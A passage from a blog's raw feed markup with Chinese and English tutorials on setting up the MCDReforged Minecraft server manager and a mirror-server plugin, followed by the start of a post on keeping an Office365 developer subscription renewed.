class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Minecraft server properties</span></span><br><span class="line"><span class="comment">#Wed Jul 08 12:17:29 CST 2020</span></span><br><span class="line"><span class="attr">broadcast-rcon-to-ops</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">view-distance</span>=<span class="string">10</span></span><br><span class="line"><span class="attr">max-build-height</span>=<span class="string">256</span></span><br><span class="line"><span class="attr">server-ip</span>=<span class="string"></span></span><br><span class="line"><span class="attr">rcon.port</span>=<span class="string">25585</span></span><br><span class="line"><span class="attr">level-seed</span>=<span class="string"></span></span><br><span class="line"><span class="attr">allow-nether</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">gamemode</span>=<span class="string">creative</span></span><br><span class="line"><span class="attr">enable-command-block</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">server-port</span>=<span class="string">25566</span></span><br><span class="line"><span class="attr">enable-rcon</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">enable-query</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">op-permission-level</span>=<span class="string">4</span></span><br><span class="line"><span class="attr">prevent-proxy-connections</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">generator-settings</span>=<span class="string"></span></span><br><span class="line"><span class="attr">resource-pack</span>=<span class="string"></span></span><br><span class="line"><span class="attr">player-idle-timeout</span>=<span class="string">0</span></span><br><span class="line"><span class="attr">level-name</span>=<span class="string">world</span></span><br><span class="line"><span class="attr">rcon.password</span>=<span class="string">password</span></span><br><span class="line"><span class="attr">motd</span>=<span class="string">Minecraft Server by GamerNoTitle</span></span><br><span class="line"><span class="attr">query.port</span>=<span class="string">25566</span></span><br><span class="line"><span class="attr">force-gamemode</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">debug</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">hardcore</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">white-list</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">broadcast-console-to-ops</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">pvp</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">spawn-npcs</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">spawn-animals</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">generate-structures</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">snooper-enabled</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">difficulty</span>=<span class="string">hard</span></span><br><span class="line"><span class="attr">function-permission-level</span>=<span class="string">2</span></span><br><span class="line"><span class="attr">network-compression-threshold</span>=<span class="string">256</span></span><br><span class="line"><span class="attr">level-type</span>=<span class="string">default</span></span><br><span class="line"><span class="attr">max-tick-time</span>=<span class="string">60000</span></span><br><span class="line"><span class="attr">spawn-monsters</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">enforce-whitelist</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">max-players</span>=<span class="string">20</span></span><br><span class="line"><span class="attr">use-native-transport</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">spawn-protection</span>=<span class="string">0</span></span><br><span class="line"><span class="attr">resource-pack-sha1</span>=<span class="string"></span></span><br><span class="line"><span class="attr">online-mode</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">allow-flight</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">max-world-size</span>=<span class="string">29999984</span></span><br></pre></td></tr></table></figure><p>其实最主要的是下面这几个</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">rcon.port</span>=<span class="string">25585</span></span><br><span class="line"><span class="attr">server-port</span>=<span class="string">25566</span></span><br><span class="line"><span class="attr">enable-rcon</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">rcon.password</span>=<span class="string">password</span></span><br></pre></td></tr></table></figure><p>保证端口不冲突即可，其他其实没啥；然后就是设置rcon的密码，然后把密码填进<code>mirror.json</code>，接着在主服务器用<code>!!mirror start</code>开服，就可以了</p><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p>工作原理很简单！就是通过MCDR打开了位于你镜像服文件夹的一个服务器，如果是Windows顺带还开多了一个powershell以免stop的时候把主服务器也stop了；关服务器的原理就是通过rcon对镜像服发起了<code>/stop</code>指令，仅此而已；同步就是对镜像服的世界文件夹覆盖</p><hr><h1 id="English"><a href="#English" class="headerlink" title="English"></a>English</h1><div class="note info flat"><p>Thanks for choosing <a href="https://github.com/GamerNoTitle/MCDR-Mirror-Server">MCDR-Mirror-Server</a> as your mirror server plugin. This page is an example of mirror plugin. Hopefully it can make you clear the working principle of the plugin and help you use the plugin more efficiently and more conveniently</p><p>Due to my lack of English (I’m still a senior high school student in China), some grammars may be wrong. If you don’t mind or help me correct it, I’ll appreciate it. Thanks♪(･ω･)ﾉ</p></div><h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><p>First, you need to download <a href="https://github.com/GamerNoTitle/MCDR-Mirror-Server">MCDR-Mirror-Server</a> plugin, you can download it from my <a href="https://github.com/GamerNoTitle/MCDR-Mirror-Server">Github</a>. For English users, you need to download <code>mirror.py</code> and <code>mirror.json</code>.</p><p>Now you have downloaded the things you need, just put <code>mirror.py</code> into plugins folder and put <code>mirror.json</code> into config folder. Congratulate! You have installed the plugin successfully!</p><p>Create a new folder in MCDR’s folder or other place, for the use or put the mirror’s file inside it.</p><div class="note warning flat"><p><strong><font color=#FF0000>For Windows users be careful: You can’t put the folder across the drive. For example, if your main server folder is in C drive, then just create the folder in C drive, don’t put it into D, E, F, etc. Since the switch method of cmd, you cannot switch to another drive while you’re using MCDR</font></strong></p></div><p>And now, but your mirror server into the folder you just created. Whether it included a MCDR is not a question, the plugin will automatically detect it.</p><p>Next, open the file <code>mirror.json</code> and edit the configuration of it</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./mirror/&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;world&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;world&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;python3 MCDReforged.py&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;remote&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;enable&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;secret&quot;</span><span class="punctuation">:</span> <span class="string">&quot;password&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">25575</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>Firstly, change <code>./mirror/</code> into the folder you just created (An absolute path or a relative path is avaliable)</p><p>Next change the list behind <code>world</code> with the format like <code>[&quot;world&quot;, &quot;world1&quot;, &quot;world2&quot;]</code>, type all your world folder in. If your server is vanilla one then just keep it</p><p>Change the content behind <code>command</code> as your server’s start command. For example, <code>java -Xms2G -Xmx4G -jar server.jar</code> for vanilla or <code>python3 MCDReforged.py</code> for MCDReforged.</p><p>Tips: For Windows users, the startup command of python is <code>py</code> or <code>python</code> not <code>python3</code> for linux users.</p><p>The following settings are the rcon ones, if you want to know what is rcon, you can visit <a href="https://wiki.vg/RCON">here</a></p><p><code>enable</code> means whether the rcon feature of mirror plugin is enabled or not, <code>true</code> to enable it, or <code>false</code> to disable it. If you disabled it, you cannot use any functions of rcon like remote shutdown and so on.</p><p><code>address</code> is the mirror server’s address. For the users who put the two server into the same computer, just keep it as <code>127.0.0.1</code></p><p><code>secret</code> is the password of your rcon, you can change it in <code>server.properties</code> file.</p><p><code>port</code> is the port of the rcon on mirror server, you can also change it in <code>server.properties</code> file</p><p><code>command</code> is the switch on allowing to use <code>!!mirror rcon &lt;command&gt;</code> command to input command to mirror server.</p><p>when you’re finished, you also need to change the port your mirror server in order to avoid the same port use between the main server and the mirror one.</p><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>For my mirror, my directory tree like this</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MCDReforged</span><br><span class="line">├─config</span><br><span class="line">├─lang</span><br><span class="line">├─mirror</span><br><span class="line">│  ├─server</span><br><span class="line">│  │  └─world</span><br><span class="line">├─plugins</span><br><span class="line">├─resources</span><br><span class="line">├─server</span><br><span class="line">│  └─world</span><br><span class="line">└─utils</span><br></pre></td></tr></table></figure><p>My mirror server folder inside MCDReforged is the folder called <code>mirror</code>, and I put a MCDR in it in order to manage my mirror server. After all, I use linux to hold the server, so my config grows like this</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./mirror/&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;world&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;world&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;python3 MCDReforged.py&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;remote&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;enable&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;secret&quot;</span><span class="punctuation">:</span> <span class="string">&quot;password&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">25575</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>My file in mirror folder like the picture below (PS: I use linux to hold the server, and I just use Windows to explore my files)</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/MCDR-Mirror-Server-Usage/Mirror-Files.png" alt="All my files in mirror folder"></p><p>and my <code>server.properties</code> of my mirror like this</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Minecraft server properties</span></span><br><span class="line"><span class="comment">#Wed Jul 08 12:17:29 CST 2020</span></span><br><span class="line"><span class="attr">broadcast-rcon-to-ops</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">view-distance</span>=<span class="string">10</span></span><br><span class="line"><span class="attr">max-build-height</span>=<span class="string">256</span></span><br><span class="line"><span class="attr">server-ip</span>=<span class="string"></span></span><br><span class="line"><span class="attr">rcon.port</span>=<span class="string">25585</span></span><br><span class="line"><span class="attr">level-seed</span>=<span class="string"></span></span><br><span class="line"><span class="attr">allow-nether</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">gamemode</span>=<span class="string">creative</span></span><br><span class="line"><span class="attr">enable-command-block</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">server-port</span>=<span class="string">25566</span></span><br><span class="line"><span class="attr">enable-rcon</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">enable-query</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">op-permission-level</span>=<span class="string">4</span></span><br><span class="line"><span class="attr">prevent-proxy-connections</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">generator-settings</span>=<span class="string"></span></span><br><span class="line"><span class="attr">resource-pack</span>=<span class="string"></span></span><br><span class="line"><span class="attr">player-idle-timeout</span>=<span class="string">0</span></span><br><span class="line"><span class="attr">level-name</span>=<span class="string">world</span></span><br><span class="line"><span class="attr">rcon.password</span>=<span class="string">password</span></span><br><span class="line"><span class="attr">motd</span>=<span class="string">Minecraft Server by GamerNoTitle</span></span><br><span class="line"><span class="attr">query.port</span>=<span class="string">25566</span></span><br><span class="line"><span class="attr">force-gamemode</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">debug</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">hardcore</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">white-list</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">broadcast-console-to-ops</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">pvp</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">spawn-npcs</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">spawn-animals</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">generate-structures</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">snooper-enabled</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">difficulty</span>=<span class="string">hard</span></span><br><span class="line"><span class="attr">function-permission-level</span>=<span class="string">2</span></span><br><span class="line"><span class="attr">network-compression-threshold</span>=<span class="string">256</span></span><br><span class="line"><span class="attr">level-type</span>=<span class="string">default</span></span><br><span class="line"><span class="attr">max-tick-time</span>=<span class="string">60000</span></span><br><span class="line"><span class="attr">spawn-monsters</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">enforce-whitelist</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">max-players</span>=<span class="string">20</span></span><br><span class="line"><span class="attr">use-native-transport</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">spawn-protection</span>=<span class="string">0</span></span><br><span class="line"><span class="attr">resource-pack-sha1</span>=<span class="string"></span></span><br><span class="line"><span class="attr">online-mode</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">allow-flight</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">max-world-size</span>=<span class="string">29999984</span></span><br></pre></td></tr></table></figure><p>The most important things are the following configuration</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">rcon.port</span>=<span class="string">25585</span></span><br><span class="line"><span class="attr">server-port</span>=<span class="string">25566</span></span><br><span class="line"><span class="attr">enable-rcon</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">rcon.password</span>=<span class="string">password</span></span><br></pre></td></tr></table></figure><p>just keep the port use not the same, and setup your rcon’s password. Type the password and port in the <code>mirror.json</code> and use <code>!!mirrro start</code> in your main server to startup your mirror. That’s it.</p><h2 id="Principle"><a href="#Principle" class="headerlink" title="Principle"></a>Principle</h2><p>It’s pretty easy! Just use MCDR to call python to use command to turn on another server. For Windows users, i’ve also create a new powershell thread to hold the mirror one in order to prevent the main server being killed. The shutdown just use rcon feature to send a <code>/stop</code> command to the mirror folder. Sync just copy the main server’s world into the mirror one.</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MCDR的正确食用方式 - 让你的服务器像TIS一样拥有QB！</title>
      <link href="/posts/MCDR-Usage/"/>
      <url>/posts/MCDR-Usage/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>你是否也想有能够在游戏内快速管理的服务器？</p><p>你是否也想像TIS一样有各种扩展？</p><p>你是否也想有<code>!!qb</code>？</p><p>MCDReforged！不要998，不要888，只要……！@#￥%……&amp;*（）</p><p>咳咳，走错片场了……</p><hr><p><a href="https://github.com/Fallen-Breath/MCDReforged/">MCDReforged</a>是一个不需要修改MC服务端的情况下，使用自定义的插件系统提供服务器的管理等功能的一个工具，由<a href="https://github.com/Fallen-Breath">@Fallen_Breath</a>开发，使用Python作为运行环境（拒绝PY2从我做起）</p><p><a href="http://mcdr.cc/">这里有一个第三方的MCDR官网，你可以参阅一下</a></p><p>本篇我们来讲讲它的用法和我开发的插件的用法</p><h3 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h3><h4 id="工作环境"><a href="#工作环境" class="headerlink" title="工作环境"></a>工作环境</h4><p>Python 的版本需要 Python 3.6+。已在如下环境中测试运行通过:</p><ul><li><code>Windows10 x64</code> <code>Python 3.6</code></li><li><code>Centos7 x64</code> <code>Python 3.8</code></li><li><code>Ubuntu18.04.4 x64</code> <code>Python 3.6</code></li></ul><p>这是佛冷测试的数据，我自己的<code>Python</code>版本是<code>3.6.9</code>，在<code>Ubuntu 18.04.4 LTS</code>上通过</p><p>你首先需要安装Python3，怎么安装请自己搜索，这不是我们这一节要讨论的内容</p><h4 id="获取MCDR"><a href="#获取MCDR" class="headerlink" title="获取MCDR"></a>获取MCDR</h4><p>你需要下载一个MCDR，我们转到MCDR的<a href="https://github.com/Fallen-Breath/MCDReforged/releases">Release</a>页面，下载最新版的MCDReforged，解压，你能得到以下目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MCDReforged</span><br><span class="line">├─config</span><br><span class="line">├─plugins</span><br><span class="line">├─resources</span><br><span class="line">│  └─lang</span><br><span class="line">├─server</span><br><span class="line">└─utils</span><br><span class="line">    ├─parser</span><br><span class="line">    └─reactor</span><br></pre></td></tr></table></figure><p>这里说一下我们将要用到的文件夹：</p><p><code>config</code>是用来存放插件的配置文件的</p><p><code>plugins</code>就是插件存放的位置，你可以到<a href="https://github.com/MCDReforged-Plugins/PluginCatalogue">MCDR插件库</a>(<a href="https://github.com/MCDReforged-Plugins/PluginCatalogue/blob/master/readme_cn.md">中文</a>)下载插件</p><p><code>server</code>就是存放服务器文件的位置，我们的服务器文件例如<code>minecraft.jar</code>、<code>world</code>都放在这个里面</p><p>其他的文件夹我们不会用到，就不动它</p><p>在MCDR的目录下打开命令行窗口，使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ pip install -r requirement.txt<span class="comment"># Windows用户</span></span><br><span class="line">$ pip3 install -r requirement.txt<span class="comment"># Linux用户</span></span><br></pre></td></tr></table></figure><p>安装MCDR运行所需要的Python模块</p><h4 id="配置MCDR"><a href="#配置MCDR" class="headerlink" title="配置MCDR"></a>配置MCDR</h4><h5 id="配置项配置"><a href="#配置项配置" class="headerlink" title="配置项配置"></a>配置项配置</h5><p>打开<code>config.yml</code>文件，里面有所有我们需要调整的MCDR参数</p><p>有以下配置项</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">en_us</span></span><br><span class="line"><span class="attr">working_directory:</span> <span class="string">server</span></span><br><span class="line"><span class="attr">start_command:</span> <span class="string">java</span> <span class="string">-Xms1G</span> <span class="string">-Xmx2G</span> <span class="string">-jar</span> <span class="string">minecraft_server.jar</span> <span class="string">nogui</span></span><br><span class="line"><span class="attr">parser:</span> <span class="string">vanilla_parser</span></span><br><span class="line"><span class="attr">encoding:</span></span><br><span class="line"><span class="attr">decoding:</span></span><br><span class="line"><span class="attr">console_command_prefix:</span> <span class="string">&#x27;!!&#x27;</span></span><br><span class="line"><span class="attr">enable_rcon:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">rcon_address:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">rcon_port:</span> <span class="number">25575</span></span><br><span class="line"><span class="attr">rcon_password:</span> <span class="string">password</span></span><br></pre></td></tr></table></figure><p>首先，如果你需要中文，就把<code>language</code>调成<code>zh_cn</code>；如果你不需要，可以不动它，直接保留<code>en_us</code></p><p><code>working_dictionary</code>是我们服务端存放的文件夹，当然你可以把<code>server</code>改成你喜欢的名字，然后在MCDR的工作目录里面新建一个与你填入的名字相同的文件夹，把服务端扔里头</p><p><code>start_command</code>就是启动服务器用的命令，也就是你在服务器文件夹里面输入的启动命令，同样如果你写在了<code>start.sh</code>里面，可以直接填<code>sh ./start.sh</code></p><p><code>parser</code>是解码器，这个你可以根据你的服务端来填，具体如下</p><table><thead><tr><th>解析器名称</th><th>兼容的服务器类型</th></tr></thead><tbody><tr><td>vanilla_parser</td><td>适用于原版 &#x2F; Carpet &#x2F; Fabric 服务端</td></tr><tr><td>bukkit_parser</td><td>适用于 1.14 以下的 Bukkit &#x2F; Spiogt 服务端，和任意版本的 Paper 服务端</td></tr><tr><td>bukkit_parser_14</td><td>适用于 1.14 及以上的 Bukkit &#x2F; Spiogt 服务端</td></tr><tr><td>forge_parser</td><td>适用于 Forge 服务端</td></tr><tr><td>cat_server_parser</td><td>适用于 <a href="https://github.com/Luohuayu/CatServer">CatServer</a> 服务端</td></tr><tr><td>bungeecord_parser</td><td>适用于Bungeecord 服务端。请在启动参数的 <code>-jar</code> 前添加 <code>-Djline.terminal=jline.UnsupportedTerminal</code> 以让其支持 MCDR 的控制，<a href="https://www.spigotmc.org/wiki/start-up-parameters/">来源</a></td></tr><tr><td>waterfall_parser</td><td>适用于 Waterfall 服务端</td></tr></tbody></table><p><code>decoding</code>和<code>encoding</code>是编码方式，一般留空即可</p><p><code>console_command_prefix</code>是MCDR的命令前缀，一般保持<code>!!</code>即可</p><p><code>enable_rcon</code>和下面的rcon设置是Minecraft服务器的Rcon，如果你要打开你需要到<code>server.properties</code>里修改rcon的相关参数</p><h5 id="权限配置"><a href="#权限配置" class="headerlink" title="权限配置"></a>权限配置</h5><p>MCDR也有插件选项，拥有<code>admin</code>权限的玩家可以在游戏内使用MCDR服务器的指令，例如<code>!!MCDR reload plugin</code>，而且有些插件也会对权限进行检查，所以这就有必要配置权限</p><p>我们打开<code>permission.yml</code>文件，在对应的用户组输入用户名即可，例如</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">default_level:</span> <span class="string">user</span></span><br><span class="line"></span><br><span class="line"><span class="attr">owner:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">GamerNoTitle</span><span class="comment"># 这里就是给我owner权限</span></span><br><span class="line"><span class="attr">admin:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">UBIthepotato</span><span class="comment"># 这里就是给UBIthepotato上admin权限</span></span><br><span class="line"><span class="attr">helper:</span></span><br><span class="line"><span class="attr">user:</span></span><br><span class="line"><span class="attr">guest:</span></span><br></pre></td></tr></table></figure><p>给完权限后，在后台使用<code>!!MCDR reload permission</code>来刷新权限</p><h4 id="启动MCDR"><a href="#启动MCDR" class="headerlink" title="启动MCDR"></a>启动MCDR</h4><p>配置完MCDR后，我们回到MCDR的工作目录，使用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python MCDReforged.py<span class="comment"># Windows用户</span></span><br><span class="line">$ python3 MCDReforged.py<span class="comment"># Linux用户</span></span><br></pre></td></tr></table></figure><p>来启动我们的服务器，当你看到提示<code>Done (12.757s)! For help, type &quot;help&quot;</code>就是启动完了（不同服务端的提示可能不一样，我这里是<code>vanilla</code></p><h4 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h4><p>首先你需要到<a href="https://github.com/MCDReforged-Plugins/PluginCatalogue">MCDR插件库</a>(<a href="https://github.com/MCDReforged-Plugins/PluginCatalogue/blob/master/readme_cn.md">中文</a>)下载插件，文件应该是一个<code>xxx.py</code>文件，有的插件会带有一个<code>xxx.json</code>的配置文件</p><p>将<code>xxx.py</code>文件放入<code>plugins</code>文件夹，将<code>xxx.json</code>放入<code>config</code>文件夹即可</p><p>如果你的服务器正在运行，可以使用<code>!!MCDR reload plugin</code>来重载插件</p><hr><h3 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h3><p>MCDR是真的好用，我的MC服务器就用的它</p><p>现在想完善一下镜像服插件的功能，想试试在主服务器关闭镜像服，不过得慢慢做了</p><p>本月我没咕！没咕！咕<del>咕</del>咕咕咕~</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Office365开发者订阅保命计划</title>
      <link href="/posts/Office365-Renew-Project/"/>
      <url>/posts/Office365-Renew-Project/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>上次有一篇<a href="/2019/08/30/Office365/">文章</a>教大家怎么白嫖了Office365 E3 Subscription for Developers（现在是E5），近期我重新申请了一次（之前的过期了），在这里教大家怎么增大微软续费的机会</p><div class="note warning flat"><p>只是增大机会，并不是一定会续费！！！</p><p>我已经续费成功一次了，截图在底部</p></div><hr><h3 id="自建网盘法"><a href="#自建网盘法" class="headerlink" title="自建网盘法"></a>自建网盘法</h3><p>Office365的E5订阅附带了5T的Onedrive（如果你是1T可以去<a href="https://admin.onedrive.com/?v=StorageSettings">Onedrive后台</a>进行调整）</p><p>这里我推荐使用<a href="https://github.com/qupb/oneindex">Oneindex</a>，使用方便</p><p>只需要自己找一个服务器搭建，使用自己的账号获取API的ID和KEYS绑定即可，记得多用，怎么部署不多说</p><h3 id="E5Sub-bot法"><a href="#E5Sub-bot法" class="headerlink" title="E5Sub_bot法"></a>E5Sub_bot法</h3><p>如果你有服务器也可以自己搭建，项目地址在这里<a href="https://github.com/iyear/E5SubBot">https://github.com/iyear/E5SubBot</a></p><p>怎么搭建就去看官方文档，这里说一下没有服务器怎么弄</p><p>我们先打开Telegram，在搜索栏搜索<a href="https://t.me/e5subbot">@E5Sub_bot</a>，打开以后在输入框搜索&#x2F;bind</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Office365-Renew-Project/E5Sub-Start.png"></p><p>接着我们点击应用注册后面的那个链接，你也可以直接点击<a 